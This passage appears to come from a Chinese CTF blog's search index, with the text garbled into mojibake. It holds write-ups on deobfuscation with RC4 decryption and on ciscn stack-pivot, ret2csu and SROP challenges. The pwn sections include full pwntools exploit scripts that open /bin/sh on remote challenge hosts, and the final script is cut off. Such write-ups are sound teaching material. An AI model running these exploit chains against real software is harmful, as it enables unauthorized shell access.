ä¼šå°è¯•å°†å…¶ä¸éšåçš„å­—èŠ‚ç»„åˆæˆä¸€æ¡æŒ‡ä»¤ã€‚\nå¦‚æœ 36h åé¢è·Ÿç€çš„å­—èŠ‚ï¼ˆå³ add dword ptr [esp], 8 çš„å­—èŠ‚ç  83ï¼‰ä¸èƒ½ä¸ 36h å½¢æˆä¸€æ¡åˆæ³•çš„æŒ‡ä»¤ï¼Œæˆ–è€…å½¢æˆäº†ç¨‹åºå‘˜ä¸æœŸæœ›çš„æŒ‡ä»¤ï¼Œè¿™å°±ä¼šå¯¼è‡´ç¨‹åºè¡Œä¸ºå¼‚å¸¸æˆ–å´©æºƒã€‚\nç„¶è€Œï¼Œåœ¨æŸäº›å¤æ‚çš„æ··æ·†ä¸­ï¼Œå¯èƒ½ä¼šåˆ©ç”¨è¿™ç§å‰ç¼€çš„ç‰¹æ€§ï¼Œä½¿å¾—å¤„ç†å™¨åœ¨ç‰¹å®šä¸Šä¸‹æ–‡ä¸­èƒ½æ­£ç¡®æ‰§è¡Œï¼Œè€Œåæ±‡ç¼–å™¨å´éš¾ä»¥ç†è§£ã€‚\n\n\n\ncallèŠ±æŒ‡ä»¤è¯†åˆ«\ncall ç›®æ ‡æ˜¯æ•°æ®å­—èŠ‚æˆ–éæŒ‡ä»¤åŒºã€‚\ncall åé¢ç´§è·Ÿæ•°æ®å®šä¹‰ã€‚\ncall ç›®æ ‡å†…éƒ¨æœ‰ add dword ptr [esp], N æ¥ä¿®æ”¹è¿”å›åœ°å€ã€‚\næœ€åä»¥ retn ç»“æŸï¼Œå¹¶ä¸” retn ä¹‹åçš„å­—èŠ‚å¯èƒ½ä¹Ÿæ˜¯æ··æ·†çš„ä¸€éƒ¨åˆ†ã€‚\nè„šæœ¬stae=0x00401006end=0x00401402 for i in range(stae, end+1):   if get_wide_dword(i)== 0x01740275:       patch_dword(i,0x90909090)       patch_dword(i-4,0x90909090)       patch_word(i+4,0x9090)       patch_word(i-5,0x90)   if get_wide_dword(i)== 0x000001E8:        if get_wide_dword(i+4)== 0x8336E800:            patch_dword(i,0x90909090)            patch_dword(i+4,0x90909090)            patch_dword(i+8,0x90909090)            patch_byte(i+12,0x90)\n\nç„¶åé€‰ä¸­å‡½æ•°å¤´Uè§£æ„\n\nCé‡æ„ä¸€ä¸‹å°±å¥½\nå°±å¯ä»¥çœ‹å¾…mainå‡½æ•°äº†\n\nåœ¨è¿™ä¸ªå‡½æ•°ä¸­çœ‹åˆ°RC4çš„æ ‡å¿—\n\nä¹‹åç»è¿‡ä¸€ä¸ªå¼‚æˆ–\nç„¶åè¿›å…¥sub_40128Fè¿›è¡Œæ ¸éªŒ\n\n\nè¿™æ˜¯å…¶åŠ å¯†åçš„å€¼\nå³é”®\næå–æ•°æ®\nå¼‚æˆ–è„šæœ¬\na=[0x0000004D, 0xFFFFFFE6, 0x00000049, 0xFFFFFF95, 0x00000003, 0x0000002D, 0x0000002B, 0xFFFFFFBA,     0xFFFFFFEA, 0x0000006D, 0xFFFFFFFF, 0x00000059, 0x00000070, 0x00000000, 0x0000001B, 0xFFFFFFA9,     0x0000002C, 0xFFFFFFB0, 0x00000032, 0xFFFFFF98, 0x0000006F, 0xFFFFFF8C, 0x00000056, 0xFFFFFFA2,     0x0000004C, 0x00000079, 0x0000007F]for i in range(len(a)-1,-1,-1):    a[i]^=a[(i+1)%len(a)]    print(a[i], end=&#x27; &#x27;)decimal_numbers =ahex_output = []for num in decimal_numbers:    unsigned_32bit_num = num &amp; 0xFFFFFFFF    hex_str = hex(unsigned_32bit_num)[2:].upper().zfill(8)    hex_output.append(&quot;0x&quot; + hex_str)for i in range(0, len(hex_output), 4):    print(&quot;, &quot;.join(hex_output[i:i+4]))    #åè¿›åˆ¶50 75 7 4294967205 4294967283 127 16 4294967176 4294967226 10 38 4294967183 4294967188 4294967188 4294967268 4294967229 66 47 4294967237 127 84 121 122 4294967279 4294967206 64 13    #åå…­è¿›åˆ¶0x0000000D, 0x00000040, 0xFFFFFFA6, 0xFFFFFFEF0x0000007A, 0x00000079, 0x00000054, 0x0000007F0xFFFFFFC5, 0x0000002F, 0x00000042, 0xFFFFFFBD0xFFFFFFE4, 0xFFFFFF94, 0xFFFFFF94, 0xFFFFFF8F0x00000026, 0x0000000A, 0xFFFFFFBA, 0xFFFFFF880x00000010, 0x0000007F, 0xFFFFFFF3, 0xFFFFFFA50x00000007, 0x0000004B, 0x00000032\n\nâ€‹\t\nå¤„ç†RC4\ndef to_unsigned_32bit_and_byte(n):    if n &lt; 0:        n += 0x100000000     return n &amp; 0xFFdef to_signed_32bit(n):    if n &gt; 0x7FFFFFFF:        n -= 0x100000000    return ndef to_unsigned_32bit(n):    if n &lt; 0:        n += 0x100000000    return n &amp; 0xFFFFFFFF# --- RC4 é˜¶æ®µ 1: KSA (å¯†é’¥è°ƒåº¦ç®—æ³•) ---# å®šä¹‰: åˆå§‹åŒ– S ç›’å¹¶æ ¹æ®å¯†é’¥å¯¹å…¶è¿›è¡Œç½®æ¢ã€‚# è¾“å…¥: å¯†é’¥å­—èŠ‚ (key_bytes), å¯†é’¥é•¿åº¦æ¨¡æ•° (key_mod_len)# è¾“å‡º: ç»è¿‡åˆå§‹ç½®æ¢çš„ S ç›’ (s_box)def s_init(key_bytes, key_mod_len):    s_box = list(range(256))    v4_ksa_t_box = [key_bytes[i % key_mod_len] for i in range(256)]         j = 0    for i in range(256):        j = (v4_ksa_t_box[i] + j + s_box[i]) % 256        s_box[i], s_box[j] = s_box[j], s_box[i]    return s_box# --- RC4 é˜¶æ®µ 2 &amp; 3: PRGA (ä¼ªéšæœºç”Ÿæˆç®—æ³•) &amp; æœ€ç»ˆæ•°æ®å¤„ç† ---# å®šä¹‰:# PRGA: æ ¹æ® S ç›’ç”Ÿæˆä¼ªéšæœºå¯†é’¥æµã€‚# æœ€ç»ˆæ•°æ®å¤„ç†: ä½¿ç”¨ç”Ÿæˆçš„å¯†é’¥æµå¯¹è¾“å…¥æ•°æ®è¿›è¡Œå¼‚æˆ–æ“ä½œã€‚# è¾“å…¥: å¾…å¤„ç†æ•°æ®æ•°ç»„ (data_array), å¯†é’¥å­—èŠ‚ (key_bytes), #       å¯†é’¥é•¿åº¦æ¨¡æ•° (key_mod_len), æ•°æ®é•¿åº¦ (data_len)# è¾“å‡º: ç»è¿‡å¤„ç†åçš„æ•°æ®æ•°ç»„ (result_am_array)def rc4_variant_process(data_array, key_bytes, key_mod_len, data_len):    # KSA é˜¶æ®µçš„è°ƒç”¨    s_box = s_init(key_bytes, key_mod_len)     l = 0    v9 = 0        # ç”¨äºå­˜å‚¨ç”Ÿæˆçš„å¯†é’¥æµ    generated_keystream = [0] * data_len     # --- RC4 é˜¶æ®µ 2: PRGA (ç”Ÿæˆå¯†é’¥æµ) ---    for k in range(data_len):         l = (l + 3) % 256         v9 = (v9 + s_box[l] + 1) % 256                 s_box[l], s_box[v9] = s_box[v9], s_box[l]                generated_keystream[k] = s_box[(s_box[v9] + s_box[l]) % 256]     # --- RC4 é˜¶æ®µ 3: æœ€ç»ˆæ•°æ®å¤„ç† (å¼‚æˆ–æ“ä½œ) ---    result_am_array = list(data_array)    for i in range(data_len):        result_am_array[i] = to_signed_32bit(to_unsigned_32bit(result_am_array[i]) ^                                               to_unsigned_32bit(generated_keystream[i]))            return result_am_arrayif __name__ == &quot;__main__&quot;:    rc4_key_string = &#x27;Hello_Ctfers!!!&#x27;    key_as_byte_list = list(map(ord, rc4_key_string))    if len(key_as_byte_list) &lt; 16:        key_as_byte_list.append(0)    KEY_MOD_LEN = 16    am_initial_hex = [        0x0000000D, 0x00000040, 0xFFFFFFA6, 0xFFFFFFEF,        0x0000007A, 0x00000079, 0x00000054, 0x0000007F,        0xFFFFFFC5, 0x0000002F, 0x00000042, 0xFFFFFFBD,        0xFFFFFFE4, 0xFFFFFF94, 0xFFFFFF94, 0xFFFFFF8F,        0x00000026, 0x0000000A, 0xFFFFFFBA, 0xFFFFFF88,        0x00000010, 0x0000007F, 0xFFFFFFF3, 0xFFFFFFA5,        0x00000007, 0x0000004B, 0x00000032    ]    am_initial_data = [to_signed_32bit(h) for h in am_initial_hex]    n = len(am_initial_data)    final_am_values = rc4_variant_process(am_initial_data, key_as_byte_list, KEY_MOD_LEN, n)        output_chars = bytearray()    for val in final_am_values:        output_chars.append(to_unsigned_32bit_and_byte(val))    print(output_chars.decode(&#x27;latin-1&#x27;))    #NSSCTF&#123;Hn_CtF_w111_end_Lol&#125;\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n","categories":["exercise_re"],"tags":["RE","èŠ±æŒ‡ä»¤"]},{"title":"ciscn_2019_es_2","url":"/2025/07/24/ciscn-2019-es-2/","content":"é¢˜ç›®\n\n\nå¾ˆæ˜æ˜¾çš„æ ˆæº¢å‡ºæ¼æ´ï¼Œä½†æ˜¯å¯æ“ä½œç©ºé—´å¤ªå°ï¼Œåªèƒ½è¦†ç›–åˆ°retï¼Œæ‰€ä»¥è¦ç”¨æ ˆè¿ç§»\n\næœ‰systemå‡½æ•°ï¼Œä½†æ˜¯éœ€è¦è‡ªå·±ä¼ å‚ï¼Œå¯ä»¥æŠŠ&#x2F;bin&#x2F;shå­—ç¬¦æ®µæ”¾åœ¨æ ˆä¸Š\næœ‰ä¸¤æ¬¡è¾“å…¥ï¼Œç¬¬ä¸€æ¬¡è¾“å…¥å¯ä»¥ç”¨æ¥æ³„éœ²ebpçš„åœ°å€\nç¬¬äºŒæ¬¡è¦æ ¹æ®æ³„éœ²åœ°å€å»æ‰¾åŠ ä¸Šåç§»å¾—åˆ°sçš„å¤´éƒ¨ï¼Œåœ¨é‚£é‡Œæ„é€ æˆ‘ä»¬çš„åé—¨å‡½æ•°ï¼Œä¹‹åé€šè¿‡retè¿”å›så¤´éƒ¨æ‰§è¡Œè¿™ä¸ªåé—¨å‡½æ•°ã€‚\nå…ˆæŸ¥çœ‹ebpè·ç¦»sçš„å®é™…è·ç¦»ï¼ˆgdbåŠ¨æ€è°ƒè¯•æŸ¥çœ‹ï¼‰\n\nç›¸è·0xffffcf18 - 0xffffcee0 &#x3D; 0x38\nä¸èƒ½ç›´æ¥é€šè¿‡ä¸‹é¢è¿™ç§æ–¹å¼æŸ¥çœ‹ï¼Œå› ä¸ºç°åœ¨çš„æ“ä½œç³»ç»Ÿé»˜è®¤å¼€å¯äº†ASLRï¼Œæ‰€ä»¥æ ˆä¸Šçš„åœ°å€ä¸€ç›´ä¼šå˜åŒ–\n\næ¥ç€æ„é€ æˆ‘ä»¬çš„åé—¨å‡½æ•°\n\nä¸”å› ä¸ºè·³è½¬åˆ°såè¿˜è¦æ‰§è¡Œï¼Œæ‰€ä»¥ç¨‹åºä¸èƒ½å´©æºƒ ï¼Œå¦‚æœså¯ä»¥ç›´æ¥è·³è½¬åˆ°åé—¨å‡½æ•°å°±å¯ä»¥ç›´æ¥æŠŠåœ°å€å†™åœ¨retä¸Š\npayload=b&#x27;aaaa&#x27;+p32(sys)+p32(main)+p32(s+16)+b&quot;/bin/sh&quot;payload=payload.ljust(0x28,b&quot;\\x00&quot;)payload+=p32(s)+p32(leave)\n\npayload.ljust(0x28, b&#39;\\x00&#39;) ä¸­å¿…é¡»ä½¿ç”¨ b&#39;\\x00&#39; å› ä¸ºprintfä¼šåœ¨æ¥ä¸‹æ¥çš„æ•°æ®ä¸­æ‰¾ç¬¦åˆ%sçš„æ•°æ®ï¼Œå¦‚æœæ²¡æœ‰â€&#x2F;x00â€ï¼Œä»–å¯èƒ½å»è¯»å–ç»§ç»­å¾€åè¯»åˆ°æ ˆä¸Šçš„æ•°æ®ï¼Œ%sæ—¶å­—ç¬¦ä¸²ï¼Œprintfè¯»åˆ°ä¸å¯æ‰“å°çš„å­—ç¬¦ä¼šå¼•å‘é”™è¯¯\nleave retè§£é‡Š\nleave\nmov esp, ebp:æŠŠespç§»åŠ¨åˆ°ebp-0x38çš„ä½ç½®ï¼ˆebp-0x38)å…¶å®å°±æ˜¯aaaaçš„ä½ç½®\npop ebpï¼šæŠŠaaaaè¿™ä¸€å—popå‡ºå»äº†\nret\npop eip:,æŠŠæ ˆé¡¶çš„systemå‡½æ•°popå‡ºå»ä½œä¸ºè¿”å›åœ°å€\nè„šæœ¬from pwn import *#p=process(&quot;./ciscn_2019_es_2&quot;)p=remote(&quot;node5.buuoj.cn&quot;,25671)sys=0x08048400main=0xdeadbeefleave=0x080485FDp.recvuntil(b&quot;name?\\n&quot;)payload=b&quot;a&quot;*0x27+b&quot;b&quot;p.send(payload)p.recvuntil(b&quot;b&quot;)s=u32(p.recv(4))-0x38print(hex(s))payload=b&#x27;aaaa&#x27;+p32(sys)+p32(main)+p32(s+16)+b&quot;/bin/sh&quot;payload=payload.ljust(0x28,b&quot;\\x00&quot;)payload+=p32(s)+p32(leave)p.sendline(payload)p.interactive()\n\n\n\næ”¶è·æ ˆç©ºé—´è¯†åˆ«\nåç§»é‡  â”‚ å¯„å­˜å™¨/æ ‡è¯†ç¬¦     |    åœ°å€     |    å†…å®¹         &lt;-- è§£é‡Š-------+------------------------------------------00:0000â”‚       esp         0xffffced0 â€”â–¸ 0x80486ca â—‚â€” dec eax /* &#x27;Hello, %s\\n&#x27; */\n\n0xffffced0: ESP å¯„å­˜å™¨å½“å‰æŒ‡å‘çš„å†…å­˜åœ°å€ã€‚\nâ€”â–¸ 0x80486ca: ESP æŒ‡å‘çš„å†…å­˜åœ°å€é‡Œå­˜å‚¨çš„å€¼ï¼Œå®ƒåˆæ˜¯ä¸€ä¸ªåœ°å€ï¼ŒæŒ‡å‘äº† 0x80486caã€‚\nâ—‚â€” dec eax /\\* &#39;Hello, %s\\n&#39; \\*/: å¯¹ 0x80486ca è¿™ä¸ªåœ°å€çš„åæ±‡ç¼–&#x2F;æ³¨é‡Šï¼Œè¿™é‡Œæ˜¾ç¤ºå®ƒæ˜¯ä¸€æ¡æŒ‡ä»¤çš„èµ·å§‹ï¼Œå¹¶ä¸”å…¶é™„è¿‘æœ‰å­—ç¬¦ä¸² â€œHello, %s\\nâ€ã€‚\nè¦æ‰¾åˆ°å­˜æ”¾å†…å®¹æ˜¯111111çš„ä½ç½®ï¼Œå°±æ˜¯11111ç›´æ¥æŒ‡å‘çš„ä½ç½®0xffffcee0\nespä¸sçš„è·ç¦»ä¸€ç›´ç–‘æƒ‘ä¸æ˜¯ç›¸è·0x28å—ï¼Œä¸ºä»€ä¹ˆè¦çœ‹è¿™ä¸ª0x38,çœ‹äº†å¾ˆå¤šå¤§ä½¬çš„wpä¹Ÿæ²¡æœ‰è¯´çš„ï¼ŒæŸ¥äº†æ‰çŸ¥é“è¿˜è¦è€ƒè™‘å †æ ˆå¹³è¡¡:joy:\nğŸ§  å…³é”®ç‚¹åœ¨äºï¼š\nchar s[0x28];\n\nè¿™ä¸ªæ•°ç»„è™½ç„¶æ˜¯ 0x28 å­—èŠ‚ï¼Œä½† å®ƒä¸æ˜¯ä» ebp - 0x28 åˆ° ebpï¼Œè€Œæ˜¯ä» ebp - 0x2c åˆ° ebp - 4ã€‚\nä¹Ÿå°±æ˜¯è¯´ï¼Œç¼–è¯‘å™¨ä¼šï¼š\n\nä¸ºå˜é‡ s[0x28] åˆ†é… 0x28 å­—èŠ‚ï¼›\nè¿˜ä¼šé¢å¤–åˆ†é… å¯¹é½ç©ºé—´ï¼ˆpaddingï¼‰ï¼Œä½¿æ•´ä¸ªæ ˆå¸§æ˜¯å¯¹é½çš„ï¼›\næ‰€ä»¥ï¼ŒçœŸæ­£å˜é‡èµ·å§‹åœ°å€æ˜¯ ebp - 0x2cï¼Œä¸æ˜¯ ebp - 0x28ã€‚\n\nğŸ‘‰ åœ¨ 32 ä½ç¨‹åºä¸­ï¼Œå˜é‡ char s[0x28] é€šå¸¸ä» ebp - 0x2c å¼€å§‹ï¼Œè€Œä¸æ˜¯ ebp - 0x28ã€‚\n\nåœ¨ 32 ä½ç¨‹åºé‡Œï¼Œesp åœ¨å»ºç«‹æ ˆå¸§æ—¶ï¼Œå¸¸å¸¸æ˜¯ ä¸ºäº†ç»™å±€éƒ¨å˜é‡å’Œè¿”å›åœ°å€å¯¹é½åˆ° 16 å­—èŠ‚ï¼Œå› æ­¤ä¼šå¤šåˆ†é…å‡ ä¸ªå­—èŠ‚ï¼›\næ‰€ä»¥ sub esp, 0x2c æ˜¯éå¸¸å¸¸è§çš„ï¼›\nå³ä½¿å˜é‡åªæœ‰ 0x28 å­—èŠ‚ï¼Œç¼–è¯‘å™¨ä¼šé¢å¤–å¤šç»™ 4 å­—èŠ‚ paddingï¼Œå½¢æˆ 0x2cã€‚\n\n\nåœ¨è¿™é‡Œä¹Ÿå¯ä»¥çœ‹åˆ°å®ƒå¼€è¾Ÿäº†ä¸æ­¢0x28ä¸ªç©ºé—´ï¼Œæ‰€ä»¥æ‰è¦gdbè°ƒè¯•çœ‹å®ƒå®é™…çš„\n                 é«˜åœ°å€ (æ ˆåº•ï¼Œå‘é«˜åœ°å€å¢é•¿)                  ^                  |+-----------------+-------------------+|     å‡½æ•°å‚æ•°    |                   |+-----------------+-------------------+|    è¿”å›åœ°å€     |                   |  (è°ƒç”¨ func() åè¿”å›åˆ°è¿™é‡Œçš„åœ°å€)+-----------------+-------------------+|  ä¿å­˜çš„æ—§ EBP   |  (OLD_SAVED_EBP)  |  &lt;- (0x080485FD - leave; ret å¤„çš„ EBP å€¼)+-----------------+-------------------+|    Padding      |   (é€šå¸¸æ˜¯ 4 å­—èŠ‚)   |  &lt;- (å¦‚æœä½ è¯´ s ä» ebp - 0x2c å¼€å§‹ï¼Œé‚£ä¹ˆè¿™éƒ¨åˆ†æ˜¯ ebp-0x2c åˆ° ebp-0x28 ä¹‹é—´çš„å¡«å……)+-----------------+-------------------+  &lt;- **ebp - 0x28**|                 |                   ||                 |                   ||                 |                   ||                 |                   ||                 |                   ||   char s[0x28]  |                   ||                 |                   ||                 |                   ||                 |                   ||                 |                   ||                 |                   ||                 |                   |+-----------------+-------------------+  &lt;- **ebp - 0x2c** (æ•°ç»„ s çš„èµ·å§‹åœ°å€)|    å…¶ä»–å±€éƒ¨å˜é‡ |                   ||    ï¼ˆå¦‚æœæœ‰ï¼‰   |                   |+-----------------+-------------------+|      ......     |                   |+-----------------+-------------------+|      å½“å‰ ESP   |                   |  &lt;- (ESP å¯„å­˜å™¨æŒ‡å‘çš„åœ°å€)+-----------------+-------------------+                  |                  v                  ä½åœ°å€ (æ ˆé¡¶ï¼Œå‘ä½åœ°å€å¢é•¿)\n\n\n\n","categories":["exercise_pwn"],"tags":["PWN","gdb"]},{"title":"ciscn_2019_s_3","url":"/2025/08/02/ciscn-2019-s-3/","content":"é¢˜ç›®\n\n\næ²¡æœ‰åé—¨å‡½æ•°ï¼Œä¹Ÿæ²¡æœ‰èƒ½ç”¨æ¥æ³„éœ²libcåœ°å€çš„ä¸œè¥¿\n\nä½†æ˜¯çœ‹åˆ°æœ‰execveå’Œä¸€äº›å¯¹å¯„å­˜å™¨çš„æ“ä½œï¼Œè€ƒè™‘csu\nåœ¨æ ˆä¸Šå†™å…¥&#x2F;bin&#x2F;sh,ä¹‹åè°ƒç”¨å®ƒ\næ•°æ®åœ¨æ ˆçš„ä½ç½®ä¸æ˜¯å›ºå®šçš„ï¼Œä½†æ˜¯åç§»æ˜¯å›ºå®šçš„\nå¯ä»¥é€šè¿‡readå’Œwriteæ¥æ³„éœ²æ ˆä¸Šçš„åœ°å€\nscuæ³„éœ²åœ°å€\nbufçš„èµ·å§‹ä½ç½®æ˜¯0x7fffffffdd70ï¼Œ70åˆ°80ä¹‹é—´æ˜¯bufçš„16ç©ºé—´\næ ˆä¸Š0x7fffffffdd90å¯¹åº”çš„æ•°æ®æ˜¯ä¸€ä¸ªæ ˆ ä¸Šçš„åœ°å€æ‰€ä»¥é€‰æ‹©è¯»å–è¿™ä¸ªä½ç½®çš„åœ°å€\nå¹¶è®¡ç®—å‡ºå®ƒå’Œbufä¹‹é—´çš„åç§»ä»¥ç²¾å‡†å®šä½bufçš„å¤´éƒ¨\nä¸”\nè¿™ä¸ªå‡½æ•°è¿”å›æ—¶ç›´æ¥retï¼Œæ²¡æœ‰è¿›è¡Œpop ebpçš„æ“ä½œï¼Œæ‰€ä»¥åœ¨æ„é€ payloadçš„æ—¶å€™ä¸éœ€è¦è¦†ç›–ebp\nè„šæœ¬\npayload=b&quot;a&quot;*16+p64(vuln)p.sendline(payload)p.recv(32)place=u64(p.recv(8))bin_sh=place-0x118print(hex(bin_sh))\n\n\n\nè°ƒç”¨64ä½æ—¶ï¼Œè®¾è®¡åé—¨å‡½æ•°éœ€è¦rax&#x3D;59ï¼ˆ#define__NR_execve 59ï¼‰;rdi&#x3D;â€&#x2F;bin&#x2F;shâ€;rsi&#x3D;0;rdx&#x3D;0;\nrax&#x3D;59åœ°å€å·²ç»æ‰¾åˆ°äº†\nROPgadgetså‘½ä»¤æŸ¥çœ‹ï¼Œå‘ç°åªæœ‰å¯¹rdiå’Œrsiçš„sæ“ä½œ\nå‰©ä¸‹çš„å°±æ˜¯åŸºæœ¬çš„csuäº†\n\nrbx_rbp_r12_r13_r14_r15#r13&gt;rdx r14&gt;rsi r15&gt;edi#call r12+rbx*8#add     rbx, 1#cmp     rbx, rbp\n\nè®¾ç½®å¥½rdxã€rsiã€rdiï¼Œç„¶åè°ƒç”¨ syscall\né¦–å…ˆr14å’Œr13ä¸€å®šè¦èµ‹å€¼ä¸º0ï¼Œè€Œä¸”r15dçš„å€¼\nå‡½æ•°ä¼šè·³è½¬åˆ°r12+rbx*8,è®©å®ƒæœ€åä¿®æ”¹rdiç„¶åæ‰§è¡Œè°ƒç”¨syscallï¼Œæ‰€ä»¥r12è¦èµ‹å€¼ä¸ºpayloadä¸­çš„pop rdiçš„åœ°æ–¹ï¼Œrbxèµ‹å€¼0\nä¸”åªè°ƒç”¨ä¸€æ¬¡\næ‰€ä»¥rbp&#x3D;1\næœ€ç»ˆæ‰§è¡Œ\nmov    rax, 59       ; syscall number for execvesyscall\n\nè„šæœ¬\npayload = b&#x27;/bin/sh\\x00&#x27; + b&#x27;b&#x27;*8 + p64(pop6)payload += p64(0)*2 + p64(bin_sh + 0x50) + p64(0)*3payload += p64(mov) + p64(rax)payload += p64(rdi) + p64(bin_sh) + p64(syscall)p.sendline(payload)p.interactive()\n\næ³¨æ„\nâœ… mov edi, r15då’Œ rdi çš„å…³ç³»\nmov edi, r15d\n\nåªçœ‹è¯­æ³•ï¼Œæ˜¯ï¼š\n\næŠŠ r15dçš„å€¼ï¼ˆ32 ä½ï¼‰èµ‹ç»™ ediï¼ˆä¹Ÿæ˜¯ 32 ä½ï¼‰\n\nä½†è¿™é‡Œæœ‰ä¸ªå…³é”®ç‚¹ï¼š\n\nåœ¨ x86-64 æ¶æ„ä¸­ï¼Œå¯¹ rdi çš„ä½ 32 ä½å†™å…¥ï¼ˆediï¼‰æ—¶ï¼Œé«˜ 32 ä½ä¼šè¢«æ¸…é›¶ï¼\n\nğŸ” ä¸¾ä¸ªä¾‹å­\nmov rdi, 0x4141414141414141mov edi, 0x42424242\n\næ‰§è¡Œå®Œç¬¬äºŒæ¡æŒ‡ä»¤åï¼Œrdiçš„å€¼æ˜¯ï¼š\nrdi == 0x0000000042424242\n\nä¹Ÿå°±æ˜¯è¯´ï¼š\n\nå†™ edi ç›¸å½“äºå…ˆæ¸…ç©º rdiï¼Œå†å†™ä½ 32 ä½\n\nmov edi, r15då…¶å®ç­‰ä»·äºï¼š\nrdi = r15 &amp; 0xffffffff\n\næ‰€ä»¥ä½ èƒ½ç”¨å®ƒæ¥è®¾ç½® rdi çš„å€¼å‰ææ˜¯ä½ è®¾ç½®çš„ r15 æ˜¯ä¸€ä¸ª 32 ä½ä»¥å†…çš„åœ°å€ï¼ˆæˆ–è€…å€¼ï¼‰ï¼Œæ¯”å¦‚ &#x2F;bin&#x2F;sh çš„åœ°å€å¿…é¡»ä½äº 0x100000000ï¼Œå¦åˆ™ä¼šä¸¢é«˜ä½ï¼Œå¯¼è‡´ execve å´©æºƒæˆ– syscall å‚æ•°é”™è¯¯\næ‰€ä»¥è¦ä¹‹åå†æ”¾è®¾ç½®rdiçš„å€¼\nè„šæœ¬from pwn import *#p=process(&quot;./ciscn_s_3&quot;)p=remote(&quot;node5.buuoj.cn&quot;,28493)syscall=0x400517vuln=0x4004EDrdi=0x4005a3rax=0x4004E2pop6=0x40059A#rbx_rbp_r12_r13_r14_r15mov=0x400580#r13&gt;rdx r14&gt;rsi r15&gt;edi            #call r12+rbx*8            #add     rbx, 1            #cmp     rbx, rbp        payload=b&quot;a&quot;*16+p64(vuln)p.sendline(payload)p.recv(32)place=u64(p.recv(8))bin_sh=place-0x118print(hex(bin_sh))payload = b&#x27;/bin/sh\\x00&#x27; + b&#x27;b&#x27;*8 + p64(pop6)payload += p64(0)*2 + p64(bin_sh + 0x50) + p64(0)*3payload += p64(mov) + p64(rax)payload += p64(rdi) + p64(bin_sh) + p64(syscall)p.sendline(payload)p.interactive()\n\n\n\nSROP\né¢˜ç›®ä¸­ä¹Ÿæœ‰sigframe\nSROP æ”»å‡»çš„åŸç†\n\nå†…æ ¸ä¿å­˜ä¸Šä¸‹æ–‡ï¼ˆæ­¥éª¤ â‘ ï¼‰ï¼šå½“ç¨‹åºæ¥æ”¶åˆ°ä¿¡å·æ—¶ï¼Œå†…æ ¸ä¼šæš‚åœç¨‹åºçš„æ‰§è¡Œï¼Œå¹¶è‡ªåŠ¨å°†å½“å‰æ‰€æœ‰å¯„å­˜å™¨ï¼ˆrax, rdi, rsi, rdx, rip, rsp ç­‰ï¼‰çš„çŠ¶æ€ä¿å­˜åˆ°ä¸€ä¸ªç‰¹æ®Šçš„ç»“æ„ä½“ä¸­ï¼Œè¿™ä¸ªç»“æ„ä½“å«åš sigcontextã€‚ç„¶åï¼Œå†…æ ¸å°†è¿™ä¸ª sigcontext å‹å…¥æ ˆä¸­ï¼Œä¸ºæ‰§è¡Œä¿¡å·å¤„ç†å‡½æ•°åšå‡†å¤‡ã€‚\næ”»å‡»è€…ä¼ªé€ ä¸Šä¸‹æ–‡ï¼šæ”»å‡»è€…åˆ©ç”¨æ ˆæº¢å‡ºæ¼æ´ï¼Œåœ¨ç¨‹åºæ¥æ”¶ä¿¡å·ä¹‹å‰ï¼Œå°±å‘æ ˆä¸­å†™å…¥ä¸€ä¸ªä¼ªé€ çš„ sigcontext ç»“æ„ä½“ã€‚è¿™ä¸ªä¼ªé€ çš„ç»“æ„ä½“ä¸­åŒ…å«äº†æ”»å‡»è€…æƒ³è¦è®¾ç½®çš„æ‰€æœ‰å¯„å­˜å™¨å€¼ã€‚ä¾‹å¦‚ï¼Œä½ å¯ä»¥æŠŠ rip è®¾ç½®ä¸º execve çš„åœ°å€ï¼ŒæŠŠ rdi è®¾ç½®ä¸º /bin/sh å­—ç¬¦ä¸²çš„åœ°å€ã€‚\nè§¦å‘ sigreturn ç³»ç»Ÿè°ƒç”¨ï¼šæ”»å‡»è€…é€šè¿‡æ„é€  ROP é“¾ï¼Œä½¿ç¨‹åºæ‰§è¡Œæµè·³è½¬åˆ°ä¸€ä¸ªèƒ½å¤Ÿæ‰§è¡Œ sigreturn ç³»ç»Ÿè°ƒç”¨çš„ gadgetã€‚sigreturn æ˜¯ä¸€ä¸ªç‰¹æ®Šçš„ç³»ç»Ÿè°ƒç”¨ï¼Œå®ƒçš„åŠŸèƒ½å°±æ˜¯ä»æ ˆä¸­è¯»å– sigcontext ç»“æ„ä½“ï¼Œå¹¶æ¢å¤å¯„å­˜å™¨çŠ¶æ€ã€‚æ”»å‡»è€…é€šå¸¸ä¼šæ‰¾åˆ°ä¸€ä¸ª mov rax, 0xf; syscall; è¿™æ ·çš„ gadgetï¼Œå…¶ä¸­ 0xf æ˜¯ sigreturn ç³»ç»Ÿè°ƒç”¨çš„ç¼–å·ã€‚\nå†…æ ¸æ¢å¤ä¸Šä¸‹æ–‡ï¼ˆæ­¥éª¤ â‘¢ï¼‰ï¼šå½“ syscall æ‰§è¡Œåï¼Œå†…æ ¸ä¼šå‘ç° rax çš„å€¼ä¸º 0xfï¼Œä¾¿ä¼šæ‰§è¡Œ sigreturnã€‚æ­£å¦‚ä½ æ‰€è¯´ï¼Œå†…æ ¸åœ¨æ‰§è¡Œè¿™ä¸€æ­¥æ—¶ä¸ä¼šå»æ ¡éªŒæ ˆä¸Šæ•°æ®çš„åˆæ³•æ€§ã€‚å®ƒä¼šç›²ç›®åœ°ä¿¡ä»»æ ˆä¸Šçš„æ•°æ®ï¼Œä»æ ˆé¡¶è¯»å–æˆ‘ä»¬ä¼ªé€ çš„ sigcontext ç»“æ„ä½“ï¼Œå¹¶ç”¨é‡Œé¢çš„å€¼æ¥æ¢å¤æ‰€æœ‰çš„å¯„å­˜å™¨ã€‚\nåŠ«æŒç¨‹åºæ‰§è¡Œæµï¼ˆæ­¥éª¤ â‘£ï¼‰ï¼šç”±äºæˆ‘ä»¬å·²ç»å°†ä¼ªé€ çš„ sigcontext ä¸­çš„ rip è®¾ç½®ä¸º execve çš„åœ°å€ï¼Œrdi è®¾ç½®ä¸º /bin/sh çš„åœ°å€ï¼Œç¨‹åºæ¢å¤å¯„å­˜å™¨åï¼Œä¼šç«‹å³è·³è½¬åˆ° execve å‡½æ•°æ‰§è¡Œï¼Œå¹¶ä»¥ /bin/sh ä½œä¸ºå‚æ•°ï¼Œæœ€ç»ˆè·å¾—ä¸€ä¸ª Shellã€‚\n\nè„šæœ¬from pwn import *context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;, log_level=&#x27;debug&#x27;)context.terminal = [&#x27;tmux&#x27;, 